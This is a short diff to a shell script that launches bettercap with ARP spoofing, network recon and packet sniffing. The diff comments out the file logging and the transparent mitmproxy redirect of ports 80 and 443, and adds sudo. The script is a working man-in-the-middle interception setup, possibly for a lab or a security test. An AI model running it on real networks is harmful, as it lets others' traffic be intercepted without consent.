@@ -21,7 +21,7 @@ touch "$SNIFF_OUTPUT_FILE"
 CMD=(
     "set net.sniff.verbose true"
     ## Ucomment if you want to log to file
-    "set net.sniff.output $SNIFF_OUTPUT_FILE"
+    # "set net.sniff.output $SNIFF_OUTPUT_FILE"
     "set arp.spoof.fullduplex true"
     "set arp.spoof.internal true"
     "net.recon on"
@@ -32,7 +32,7 @@ CMD=(
     # redirct to mitmproxy
     "set any.proxy.dst_port 8080"
     "set any.proxy.src_port 80, 443"
-    "any.proxy on"
+    # "any.proxy on"
 )
 
 echo "Running bettercap with the following commands"
@@ -52,11 +52,11 @@ animation_XD() {
 
 # betterCap
 animation_XD "Starting bettercap"
-bettercap -eval "$(
+sudo bettercap -eval "$(
     IFS='; '
     echo "${CMD[*]}"
 )"
 
 # mitmproxy
-animation_XD "Starting mitmproxy"
-mitmproxy --mode transparent -p 8080 -s agent.py --set block_global=false
+# animation_XD "Starting mitmproxy"
+# sudo mitmproxy --mode transparent -p 8080 -s agent.py --set block_global=false
